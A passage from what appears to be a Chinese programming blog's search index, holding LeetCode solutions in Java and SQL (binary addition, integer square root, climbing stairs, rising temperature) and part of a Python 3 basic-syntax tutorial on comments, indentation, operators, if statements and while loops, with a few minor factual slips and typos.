<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lenA = a.length(), lenB = b.length();</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">int</span> i = lenA - <span class="number">1</span>, j = lenB - <span class="number">1</span>, carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum = carry;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            sum += a.charAt(i--) - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            sum += b.charAt(j--) - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sum % <span class="number">2</span>);</span><br><span class="line">        carry = sum / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (carry != <span class="number">0</span>) &#123;</span><br><span class="line">        sb.append(carry);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/2020-03-02-000067-big-num-add.PNG" alt="大数相加"></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>69. x 的平方根</title>
    <url>/2018/08/28/LeetCode/leetcode-000069.%20x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现 <code>int sqrt(int x)</code> 函数。</p>
<p>计算并返回 <code>x</code> 的平方根，其中 <code>x</code> 是非负整数。</p>
<p>由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 4</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 8</span><br><span class="line">输出: 2</span><br><span class="line">说明: 8 的平方根是 2.82842..., </span><br><span class="line">     由于返回类型是整数，小数部分将被舍去。</span><br></pre></td></tr></table></figure>
<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用牛顿迭代法。<br>牛顿迭代法（Newton’s method）又称为牛顿-拉夫逊（拉弗森）方法（Newton-Raphson method），它是牛顿在17世纪提出的一种在实数域和复数域上近似求解方程的方法。<br>仔细思考一下就能发现，我们需要解决的问题可以简单化理解。<br>从函数意义上理解：我们是要求函数f(x) = x²，使f(x) = num的近似解，即x² - num = 0的近似解。<br>从几何意义上理解：我们是要求抛物线g(x) = x² - num与x轴交点（g(x) = 0）最接近的点。<br>我们假设g(x0)=0，即x0是正解，那么我们要做的就是让近似解x不断逼近x0，这是函数导数的定义：</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-qiudaoshu.gif" alt="求导数"></p>
<p>可以由此得到</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-daoshu.gif" alt="导数 "></p>
<p>从几何图形上看，因为导数是切线，通过不断迭代，导数与x轴的交点会不断逼近x0。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-daoshu2.gif" alt="导数图示"></p>
<p>对于一般情况：</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-tuidaoguocheng.jpg" alt="推导过程"></p>
<p>将m=2代入：</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-qiupingfanggen.jpg" alt="求平方根"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> r = x;</span><br><span class="line">    <span class="keyword">while</span> (r*r &gt; x) &#123;</span><br><span class="line">        r = (r + x/r) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>二分查找法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;  <span class="comment">//二分法</span></span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> up = x;</span><br><span class="line">    <span class="keyword">while</span>(low &lt;= up)&#123;</span><br><span class="line">        <span class="keyword">long</span> mid = (low + up) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">long</span> s = mid * mid;</span><br><span class="line">        <span class="keyword">if</span>(x == s) &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(x &gt; s) &#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            up = mid -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> up;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>因为最后答案肯定是个整数，那么只要找到平方数小于给定值的最大整数即可，这里要考虑到溢出问题，所以在相乘的时候，得用long。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> i = <span class="number">0</span>; ;i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i * i &gt; x) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>70. 爬楼梯</title>
    <url>/2018/08/28/LeetCode/leetcode-000070.%20%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
    <content><![CDATA[<p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。</p>
<p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
<p>注意：给定 n 是一个正整数。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 2</span><br><span class="line">输出： 2</span><br><span class="line">解释： 有两种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶</span><br><span class="line">2.  2 阶</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 3</span><br><span class="line">输出： 3</span><br><span class="line">解释： 有三种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶 + 1 阶</span><br><span class="line">2.  1 阶 + 2 阶</span><br><span class="line">3.  2 阶 + 1 阶</span><br></pre></td></tr></table></figure>

<p>解法：<br>爬一个台阶有一种方法，两个台阶有两种方法，那么三个台阶就有1（爬一个台阶） + 2（爬两个台阶）= 3种方法，依次类推，f(n) = f(n -1) + f(n - 2)。很明显，这是一个求fibonacci数列的问题，于是就有了代码块1.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> climbStairs(n - <span class="number">1</span>) + climbStairs(n - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提交之后，发现运行超时，那明显，就是计算量过大，于是，需要将中间计算的结果保存起来，有了代码块2。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> begin = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> f1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> f2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> f3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (begin &lt;= n) &#123;</span><br><span class="line">        f3 = f1 + f2;</span><br><span class="line">        f1 = f2;</span><br><span class="line">        f2 = f3;</span><br><span class="line">        begin++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>197. 上升的温度</title>
    <url>/2018/08/28/LeetCode/leetcode-000197.%20%E4%B8%8A%E5%8D%87%E7%9A%84%E6%B8%A9%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <code>Weather</code> 表，编写一个 SQL 查询，来查找与之前（昨天的）日期相比温度更高的所有日期的 Id。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+------------------+------------------+</span><br><span class="line">| Id(INT) | RecordDate(DATE) | Temperature(INT) |</span><br><span class="line">+---------+------------------+------------------+</span><br><span class="line">|       1 |       2015-01-01 |               10 |</span><br><span class="line">|       2 |       2015-01-02 |               25 |</span><br><span class="line">|       3 |       2015-01-03 |               20 |</span><br><span class="line">|       4 |       2015-01-04 |               30 |</span><br><span class="line">+---------+------------------+------------------+</span><br></pre></td></tr></table></figure>
<p>例如，根据上述给定的 <code>Weather</code> 表格，返回如下 Id:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+</span><br><span class="line">| Id |</span><br><span class="line">+----+</span><br><span class="line">|  2 |</span><br><span class="line">|  4 |</span><br><span class="line">+----+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">SELECT w1.Id FROM Weather w1, Weather w2 WHERE w1.Temperature &gt; w2.<span class="function">Temperature AND <span class="title">TO_DAYS</span><span class="params">(w1.RecordDate)</span> </span>= TO_DAYS(w2.RecordDate) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>元组内建函数</title>
    <url>/2018/01/17/python/python101/python-7-%E5%85%83%E7%BB%84%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>元组</tag>
      </tags>
  </entry>
  <entry>
    <title>set内建函数</title>
    <url>/2018/01/16/python/python101/python-6-set%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>set</tag>
      </tags>
  </entry>
  <entry>
    <title>字典内建函数</title>
    <url>/2018/01/15/python/python101/python-5-%E5%AD%97%E5%85%B8%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>list内建函数</title>
    <url>/2018/01/14/python/python101/python-4-list%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>list</tag>
      </tags>
  </entry>
  <entry>
    <title>基本语法</title>
    <url>/2018/01/13/python/python101/python-8-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，Python 3 源码文件以UTF-8编码，所有的字符串都是unicode字符串。当然，也可以为源码文件指定不同的编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: cp-1252 -*-</span><br></pre></td></tr></table></figure>
<p>上述定义允许在源文件中使用 Windows-1252 字符集中的字符编码，对应适合语言为保加利亚语、白罗斯语、马其顿语、俄语、塞尔维亚语。</p>
<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>标识符是对对象引用起的一个名字。在python中，需要遵循以下规则：</p>
<ol>
<li>长度任意长</li>
<li>不能和python 3的关键字，即保留字，同名</li>
<li>标识符ASCII字母、下划线以及大多数非英文语言的字母，只要是Unicode编码的字母都可以充当引导字符，后续字符可以是任意引导符，或任意非空格字符，包括Unicode编码中认为是数字的任意字符</li>
<li>不要使用Python预定义的标识符名，因此要避免使用NotImplemented与Eliiipsis等名字，这些在未来有可能被Python的新版本使用到</li>
<li>不要使用Python内置函数名或内置数据类型或异常名作为标识符名</li>
<li>关于下划线的约定，名字的开头和结尾都使用下划线的情况应该避免，因为Python中大量采用这种名字定义了各种特殊方法和变量；在有些情况，以一个或两个下划线引导的名称，但是没有使用两个下划线结尾的应该特殊对待</li>
</ol>
<h2 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h2><p>保留字即关键字，不能被用作任何的标识符名称。python的标准库提供了一个keyword模块，可以输出当前版本的所有关键字。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import keyword</span><br><span class="line">keyword.kwlist</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/keyword.PNG" alt="keyword"></p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>python 中有3种注释方式：</p>
<ol>
<li>单行注释以<code>#</code>开头</li>
<li>多行注释用三个单引号<code>&#39;&#39;&#39;</code>，将被注释语句包围起来</li>
<li>多行注释用三个双引号<code>&quot;&quot;&quot;</code>，将被注释语句包围起来<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单行注释</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">这也是多行注释</span></span><br><span class="line"><span class="string">这也是多行注释</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>python和其他语言最大的区别就是它使用缩进来表示代码块，不需要使用大括号<code>{}</code>。<br>缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进格数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> s:</span><br><span class="line">print(v)</span><br><span class="line"></span><br><span class="line">s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> s:    </span><br><span class="line">    print(v)   <span class="comment"># 缩进四个空格</span></span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%BC%A9%E8%BF%9B1.PNG" alt="未缩进"></p>
<p><img src="https://huhansi.github.io/images/%E7%BC%A9%E8%BF%9B2.PNG" alt="缩进"></p>
<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠()来实现多行语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> \</span><br><span class="line">	,<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">s</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%A4%9A%E8%A1%8C.PNG" alt="多行语句"></p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>python 3 支持一下类型的运算符。</p>
<h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加 两个对象相加</td>
<td>a = 1; b = 2; a + b = 3</td>
</tr>
<tr>
<td>-</td>
<td>减 两个对象相减</td>
<td>a = 1; b = 2; a - b = -1</td>
</tr>
<tr>
<td>*</td>
<td>乘 两个对象相乘</td>
<td>a = 1; b = 2; a * b = 2</td>
</tr>
<tr>
<td>/</td>
<td>除 两个对象相除</td>
<td>a = 1; b = 2; a / b = 0.5</td>
</tr>
<tr>
<td>%</td>
<td>取模 返回除法的余数</td>
<td>a = 1; b = 2; a % b = 1</td>
</tr>
<tr>
<td>**</td>
<td>幂 返回x的y次幂</td>
<td>a = 1; b = 2; a ** b = 1</td>
</tr>
<tr>
<td>//</td>
<td>取整除 返回商的整数部分（向下取整）</td>
<td>a = 1; b = 2; a // b = 0</td>
</tr>
<tr>
<td>### 关系运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>==</td>
<td>等于 比较两个对象是否相等</td>
<td>a = 1; b = 2; a == b false</td>
</tr>
<tr>
<td>！=</td>
<td>不等于 比较两个对象是否不相等</td>
<td>a = 1; b = 2; a ！= b true</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>不等于 比较两个对象是否不相等</td>
<td>a = 1; b = 2; a &lt;&gt; b true</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于 返回x是否大于y</td>
<td>a = 1; b = 2; a &gt; b false</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于 返回x是否小于y。</td>
<td>a = 1; b = 2; a &lt; b true</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于 返回x是否大于等于y</td>
<td>a = 1; b = 2; a &gt;= b false</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于 返回x是否小于等于y</td>
<td>a = 1; b = 2; a &lt;= b true</td>
</tr>
<tr>
<td>### 赋值运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>=</td>
<td>赋值运算符</td>
<td>a = 1; b = 2; c = a + b</td>
</tr>
<tr>
<td>+=</td>
<td>加法赋值运算符</td>
<td>c += a 等效于 c = c + a</td>
</tr>
<tr>
<td>-=</td>
<td>减法赋值运算符</td>
<td>c -= a 等效于 c = c - a</td>
</tr>
<tr>
<td>*=</td>
<td>乘法赋值运算符</td>
<td>c *= a 等效于 c = c * a</td>
</tr>
<tr>
<td>/=</td>
<td>除法赋值运算符</td>
<td>c /= a 等效于 c = c / a</td>
</tr>
<tr>
<td>%=</td>
<td>取模赋值运算符</td>
<td>c %= a 等效于 c = c % a</td>
</tr>
<tr>
<td>**=</td>
<td>幂赋值运算符</td>
<td>c *<em>= a 等效于 c = c *</em> a</td>
</tr>
<tr>
<td>//=</td>
<td>取整除赋值运算符</td>
<td>c //= a 等效于 c = c // a</td>
</tr>
<tr>
<td>### 逻辑运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>and</td>
<td>a and b</td>
<td>布尔 <code>与</code>-如果a为False，a and b 返回False，否则它返回b的计算值</td>
</tr>
<tr>
<td>or</td>
<td>a or b</td>
<td>布尔 <code>或</code>-如果a为True，a and b 返回True，否则它返回b的计算值</td>
</tr>
<tr>
<td>not</td>
<td>not a</td>
<td>布尔 <code>非</code>-如果a为True，返回False，如果a为False，它返回True</td>
</tr>
<tr>
<td>### 位运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>假设a为60，b为13</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://huhansi.github.io/images/%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6.PNG" alt="位运算符"></p>
<h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>in</td>
<td>如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td>x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td>not in</td>
<td>如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td>x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td>
</tr>
<tr>
<td>### 身份运算符</td>
<td></td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>描述</td>
<td>实例</td>
</tr>
<tr>
<td>—-</td>
<td>——–</td>
<td>—————-</td>
</tr>
<tr>
<td>is</td>
<td>is 是判断两个标识符是不是引用自一个对象</td>
<td>x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False</td>
</tr>
<tr>
<td>is not</td>
<td>is not 是判断两个标识符是不是引用自不同对象</td>
<td>x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td>
</tr>
<tr>
<td>### 运算符优先级</td>
<td></td>
<td></td>
</tr>
<tr>
<td>以下表格给出了从最高到最低优先级的所有运算符</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://huhansi.github.io/images/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7.PNG" alt="运算符优先级"></p>
<h2 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h2><p>Python条件语句是通过一条或多条语句的执行结果（True或者False）来决定执行的代码块。<br>可以通过下图来简单了解条件语句的执行过程</p>
<p><img src="https://huhansi.github.io/images/if-condition.jpg" alt="条件语句执行过程"></p>
<h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><p>python中if语句的一般形式如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition_1:</span><br><span class="line">	statement_block_1</span><br><span class="line"><span class="keyword">elif</span> condition_2:</span><br><span class="line">	statement_block_2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	statement_block_3</span><br></pre></td></tr></table></figure>
<p>· 如果“condition_1”为True，将执行statement_block_1块语句<br>· 如果“condition_2”为False，将判断“condition_2”<br>· 如果“condition_2”为True，将执行statement_block_2块语句<br>· 如果“condition_2”为False，将执行statement_block_3块语句</p>
<p>Python中使用了<code>elif</code> 代替了 <code>else if</code>，所以 <code>if</code>语句的关键字为：<code>if-wlif-else</code>。<br>注意：<br>    · 每个条件后面要使用冒号 :，表示接下来是满足条件后要执行的语句块。<br>    · 使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。<br>    · 在Python中没有switch – case语句。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a = 15</span></span><br><span class="line"><span class="comment"># a = 6</span></span><br><span class="line">a = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> a &gt; <span class="number">10</span>:</span><br><span class="line">	print(<span class="string">"a is bigger than 10"</span>)</span><br><span class="line"><span class="keyword">elif</span> a &gt; <span class="number">5</span>:</span><br><span class="line">	print(<span class="string">"a is bigger than 5 less than 10"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(<span class="string">"a is less than 5"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/if%E7%A4%BA%E4%BE%8B.PNG" alt="if示例"></p>
<h4 id="if-嵌套"><a href="#if-嵌套" class="headerlink" title="if 嵌套"></a>if 嵌套</h4><p>在嵌套 <code>if</code> 语句中，可以把 <code>if...elif...else</code> 结构放在另外一个 <code>if...elif...else</code> 结构中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 表达式<span class="number">1</span>:</span><br><span class="line">    语句</span><br><span class="line">    <span class="keyword">if</span> 表达式<span class="number">2</span>:</span><br><span class="line">        语句</span><br><span class="line">    <span class="keyword">elif</span> 表达式<span class="number">3</span>:</span><br><span class="line">        语句</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        语句</span><br><span class="line"><span class="keyword">elif</span> 表达式<span class="number">4</span>:</span><br><span class="line">    语句</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    语句</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">num = int(input(<span class="string">"输入一个数字："</span>))</span><br><span class="line"><span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> num %<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字可以整除 2 和 3"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字可以整除 2，但不能整除 3"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字可以整除 3，但不能整除 2"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"你输入的数字不能整除 2 和 3"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>Python中的循环语句有for和while。<br>python循环语句的控制结构图如下所示：</p>
<p><img src="https://huhansi.github.io/images/while_loop_1.png" alt="while循环"></p>
<p>while语句的一般形式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 判断条件:</span><br><span class="line">	语句</span><br></pre></td></tr></table></figure>
<p>同样需要注意冒号和缩进。另外，在python中没有<code>do...while</code>循环。<br>以下示例使用了while来计算1到100的总和：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"> </span><br><span class="line">n = <span class="number">100</span></span><br><span class="line"> </span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line">counter = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> counter &lt;= n:</span><br><span class="line">    sum = sum + counter</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">print(<span class="string">"1 到 %d 之和为: %d"</span> % (n,sum))</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/sum.PNG" alt="while循环"></p>
<h4 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h4><p>我们可以通过设置条件表达式永远不为 false 来实现无限循环，实例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">var = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> var == <span class="number">1</span> :  <span class="comment"># 表达式永远为 true</span></span><br><span class="line">   num = int(input(<span class="string">"输入一个数字  :"</span>))</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"你输入的数字是: "</span>, num)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本，输出结果如下：</p>
